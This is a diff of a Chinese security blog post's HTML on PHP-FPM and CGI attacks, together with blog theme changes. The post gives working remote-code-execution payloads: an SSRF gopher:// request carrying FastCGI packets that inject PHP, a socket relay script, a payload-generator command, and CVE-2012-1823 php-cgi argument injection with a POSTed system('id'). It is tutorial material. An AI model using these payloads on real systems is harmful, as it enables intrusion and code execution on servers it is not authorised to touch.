-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /ssrf.php?url=gopher%3A//127.0.0.1%3A9000/_%2501%2501%252C%2504%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%252C%2504%2501%25DB%2500%2500%250E%2502CONTENT_LENGTH24%250C%2510CONTENT_TYPEapplication/text%250B%2504REMOTE_PORT9985%250B%2509SERVER_NAMElocalhost%2511%250BGATEWAY_INTERFACEFastCGI/1.0%250F%250ESERVER_SOFTWAREphp/fcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250F%2517SCRIPT_FILENAME/var/www/html/phpin.php%250B%2517SCRIPT_NAME/var/www/html/phpin.php%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A//input%250E%2504REQUEST_METHODPOST%250B%2502SERVER_PORT80%250F%2508SERVER_PROTOCOLHTTP/1.1%250C%2500QUERY_STRING%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%250D%2501DOCUMENT_ROOT/%250B%2509SERVER_ADDR127.0.0.1%250B%2517REQUEST_URI/var/www/html/phpin.php%2501%2504%252C%2504%2500%2500%2500%2500%2501%2505%252C%2504%2500%2518%2500%2500%253C%253Fphp%2520echo%2520%2560id%2560%253B%2520exit%253B%253F%253E%2501%2505%252C%2504%2500%2500%2500%2500 HTTP/1.1</span><br><span class="line">Host: 192.168.110.145</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;ssrf.php?url&#x3D;gopher%3A&#x2F;&#x2F;127.0.0.1%3A9000&#x2F;_%2501%2501%252C%2504%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%252C%2504%2501%25DB%2500%2500%250E%2502CONTENT_LENGTH24%250C%2510CONTENT_TYPEapplication&#x2F;text%250B%2504REMOTE_PORT9985%250B%2509SERVER_NAMElocalhost%2511%250BGATEWAY_INTERFACEFastCGI&#x2F;1.0%250F%250ESERVER_SOFTWAREphp&#x2F;fcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250F%2517SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;phpin.php%250B%2517SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;phpin.php%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A&#x2F;&#x2F;input%250E%2504REQUEST_METHODPOST%250B%2502SERVER_PORT80%250F%2508SERVER_PROTOCOLHTTP&#x2F;1.1%250C%2500QUERY_STRING%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%250D%2501DOCUMENT_ROOT&#x2F;%250B%2509SERVER_ADDR127.0.0.1%250B%2517REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;phpin.php%2501%2504%252C%2504%2500%2500%2500%2500%2501%2505%252C%2504%2500%2518%2500%2500%253C%253Fphp%2520echo%2520%2560id%2560%253B%2520exit%253B%253F%253E%2501%2505%252C%2504%2500%2500%2500%2500 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.110.145</span><br></pre></td></tr></table></figure>
+
 
 <h3 id="unix-fpm"><a href="#unix-fpm" class="headerlink" title="unix+fpm"></a>unix+fpm</h3><p>改一下配置 nginx</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/nginx/sites-enabled/default</span><br></pre></td></tr></table></figure>
-
 <p>改成这样</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">        include snippets/fastcgi-php.conf;</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#       # With php-fpm (or other unix sockets):</span></span><br><span class="line">        fastcgi_pass unix:/var/run/php/php7.0-fpm.sock;</span><br><span class="line"><span class="comment">#       # With php-cgi (or other tcp sockets):</span></span><br><span class="line">        <span class="comment">#fastcgi_pass 127.0.0.1:9000;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+
 <p>默认情况下，套接字的位置在/run/php/php7.3-fpm.sock</p>
-<p>可以通过/etc/php/7.3/fpm/pool.d/<a href="http://www.conf查看" target="_blank" rel="noopener">www.conf查看</a></p>
+<p>可以通过/etc/php/7.3/fpm/pool.d/<a class="link" target="_blank" rel="noopener" href="http://www.conf查看">www.conf查看<i class="fas fa-external-link-alt"></i></a></p>
 <p>这里直接设置成/run/php/php7.3-fpm.sock</p>
-<p>sudo vim /etc/php/7.3/fpm/pool.d/<a href="http://www.conf" target="_blank" rel="noopener">www.conf</a></p>
+<p>sudo vim /etc/php/7.3/fpm/pool.d/<a class="link" target="_blank" rel="noopener" href="http://www.conf">www.conf<i class="fas fa-external-link-alt"></i></a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;listen = 127.0.0.1:9000</span><br><span class="line">listen = /run/php/php7.3-fpm.sock</span><br></pre></td></tr></table></figure>
+
 
 <p>测试</p>
 <p>unix.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$sock=stream_socket_client(<span class="string">'unix:///run/php/php7.3-fpm.sock'</span>);</span><br><span class="line">fputs($sock, base64_decode($_POST[<span class="string">'A'</span>]));</span><br><span class="line">var_dump(fread($sock, <span class="number">4096</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$sock</span>=stream_socket_client(<span class="string">&#x27;unix:///run/php/php7.3-fpm.sock&#x27;</span>);</span><br><span class="line">fputs(<span class="variable">$sock</span>, base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;A&#x27;</span>]));</span><br><span class="line">var_dump(fread(<span class="variable">$sock</span>, <span class="number">4096</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 
 <p>生成一下payload</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="string">'gopherfpm.py'</span> 127.0.0.1 /var/www/html/phpin.php -c <span class="string">'&lt;?php echo `id`; exit;?&gt;'</span> -p 9000</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="string">&#x27;gopherfpm.py&#x27;</span> 127.0.0.1 /var/www/html/phpin.php -c <span class="string">&#x27;&lt;?php echo `id`; exit;?&gt;&#x27;</span> -p 9000</span><br></pre></td></tr></table></figure>
+
 
 <p>访问unix， 把生成的base64数据post一下</p>
 <h2 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h2><p>当querystring中不包含没有解码的<code>=</code>号的情况下，要将querystring作为cgi的参数传入。所以，Apache服务器按要求实现了这个功能 也就是把输入的参数，当成了cgi的命令来执行</p>
 <p>常用的cgi参数有</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-c 指定php.ini文件的位置</span><br><span class="line">-n 不要加载php.ini文件</span><br><span class="line">-d 指定配置项</span><br><span class="line">-b 启动fastcgi进程</span><br><span class="line">-s 显示文件源码</span><br><span class="line">-T 执行指定次该文件</span><br><span class="line">-h和-? 显示帮助</span><br></pre></td></tr></table></figure>
 
+
 <p>测试</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?-s</span><br></pre></td></tr></table></figure>
-
 <p>可以拿到源码</p>
 <p>利用-d 添加auto_prepend_file </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?-d+allow_url_include%3Don+-d%20auto_prepend_file%3Dphp%3A//input</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?-d+allow_url_include%3Don+-d%20auto_prepend_file%3Dphp%3A&#x2F;&#x2F;input</span><br></pre></td></tr></table></figure>
 <p>post</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">'id'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;id&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
 
 <p>参考链接</p>
-<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
-<p><a href="https://vulhub.org/#/environments/php/CVE-2012-1823/" target="_blank" rel="noopener">https://vulhub.org/#/environments/php/CVE-2012-1823/</a></p>
-<p><a href="https://mp.weixin.qq.com/s/ZvDkrlHn34eMWz_eFXeQmw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZvDkrlHn34eMWz_eFXeQmw</a></p>
-
-            
-
+<p><a class="link" target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://vulhub.org/#/environments/php/CVE-2012-1823/">https://vulhub.org/#/environments/php/CVE-2012-1823/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ZvDkrlHn34eMWz_eFXeQmw">https://mp.weixin.qq.com/s/ZvDkrlHn34eMWz_eFXeQmw<i class="fas fa-external-link-alt"></i></a></p>
 
         </div>
-    </div>
-    <div id="post-footer" class="post-footer main-content-wrap">
+
         
-        
-            <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/25/php可变变量/"
-                    data-tooltip="php可变变量"
-                    aria-label="上一篇: php可变变量"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/24/php-session/"
-                    data-tooltip="php-session"
-                    aria-label="下一篇: php-session"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：php-fpm&amp;&amp;cgi</li>
+        <li>Post author：p1k</li>
+        <li>Create time：2019-09-25 08:26:00</li>
+        <li>
+            Post link：http://p1keman.github.io/2019/09/25/php-fpm/
         </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/25/php-fpm/"
-                    title="分享到 Facebook"
-                    aria-label="分享到 Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/25/php-fpm/"
-                    title="分享到 Twitter"
-                    aria-label="分享到 Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/25/php-fpm/"
-                    title="分享到 Google+"
-                    aria-label="分享到 Google+"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
         </li>
     </ul>
 </div>
 
+            </div>
+        
 
         
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2019/09/25/php%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">php可变变量</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2019/09/24/php-session/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">php-session</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
         
-            
+
         
     </div>
-</article>
+</div>
 
 
+                
+            </div>
 
-                <footer id="footer" class="main-content-wrap">
-    <span class="copyrights">
-        Copyrights &copy; 2020 John Doe. All Rights Reserved.
-    </span>
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">p1k</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.3.1</a>
+        </div>
+    </div>
 </footer>
 
-            </div>
-            
-                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
-                    <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/25/php可变变量/"
-                    data-tooltip="php可变变量"
-                    aria-label="上一篇: php可变变量"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/24/php-session/"
-                    data-tooltip="php-session"
-                    aria-label="下一篇: php-session"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
-        </li>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/25/php-fpm/"
-                    title="分享到 Facebook"
-                    aria-label="分享到 Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
             </li>
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/25/php-fpm/"
-                    title="分享到 Twitter"
-                    aria-label="分享到 Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
+
+        <!-- go comment -->
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/25/php-fpm/"
-                    title="分享到 Google+"
-                    aria-label="分享到 Google+"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
-        </li>
     </ul>
 </div>
 
-
-                </div>
-                
-    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
-        <i id="btn-close-shareoptions" class="fa fa-times"></i>
-        <ul class="share-options">
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/25/php-fpm/"
-                        aria-label="分享到 Facebook"
-                    >
-                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/25/php-fpm/"
-                        aria-label="分享到 Twitter"
-                    >
-                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/25/php-fpm/"
-                        aria-label="分享到 Google+"
-                    >
-                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
-                    </a>
-                </li>
-            
-        </ul>
-    </div>
-
-
-            
         </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
         
 
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
 
-<div id="about">
-    <div id="about-card">
-        <div id="about-btn-close">
-            <i class="fa fa-times"></i>
-        </div>
-        
-            <h4 id="about-card-name">John Doe</h4>
-        
-            <div id="about-card-bio"><p>author.bio</p>
-</div>
-        
-        
-            <div id="about-card-job">
-                <i class="fa fa-briefcase"></i>
-                <br/>
-                <p>author.job</p>
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
 
-            </div>
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
         
-        
-    </div>
+    </ul>
 </div>
 
-        
-        
-<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
-        <!--SCRIPTS-->
-<script src="/assets/js/script-hvks0tjho7hhxxjwgvjgerqzsheh4pu8sgih6uruqsx2fdeiyiflclfy2v4q.min.js"></script>
-<!--SCRIPTS END-->
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#FPM"><span class="nav-text">FPM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="nav-text">FPM未授权访问漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E6%94%B9%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="nav-text">更改配置项</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87open-basedir"><span class="nav-text">绕过open_basedir</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssrf-fpm"><span class="nav-text">ssrf+fpm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unix-fpm"><span class="nav-text">unix+fpm</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CGI"><span class="nav-text">CGI</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
 
 
     
 
+</main>
 
 
 
-    </body>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
 </html>
